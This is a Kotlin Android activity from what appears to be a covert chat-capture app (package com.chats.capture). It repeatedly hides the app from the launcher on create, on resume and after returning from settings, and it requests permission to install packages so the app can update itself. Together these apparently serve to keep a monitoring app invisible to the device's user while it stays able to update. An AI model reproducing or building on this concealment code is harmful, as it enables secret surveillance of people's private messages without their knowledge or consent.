package com.chats.capture.ui

import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import androidx.appcompat.app.AppCompatActivity
import com.chats.capture.R
import com.chats.capture.utils.AppHider
import com.chats.capture.utils.AppVisibilityManager
import timber.log.Timber

class UpdatePermissionActivity : AppCompatActivity() {
    
    companion object {
        const val REQUEST_INSTALL_PERMISSION = 1001
    }
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Always hide app from launcher (Device Owner mode)
        AppVisibilityManager.hideFromLauncher(this)
        AppHider.ensureHidden(this)
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            if (!packageManager.canRequestPackageInstalls()) {
                // Request permission
                val intent = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES).apply {
                    data = Uri.parse("package:$packageName")
                }
                startActivityForResult(intent, REQUEST_INSTALL_PERMISSION)
            } else {
                // Permission already granted
                finish()
            }
        } else {
            // Pre-Oreo, no special permission needed
            finish()
        }
    }
    
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        
        if (requestCode == REQUEST_INSTALL_PERMISSION) {
            // Re-hide app after returning from settings
            AppVisibilityManager.hideFromLauncher(this)
            AppHider.ensureHidden(this)
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                if (packageManager.canRequestPackageInstalls()) {
                    Timber.d("Install permission granted")
                    // Permission granted, can proceed with updates
                } else {
                    Timber.w("Install permission denied")
                }
            }
            finish()
        }
    }
    
    override fun onResume() {
        super.onResume()
        // Re-hide app when resuming
        AppVisibilityManager.hideFromLauncher(this)
        AppHider.ensureHidden(this)
    }
}
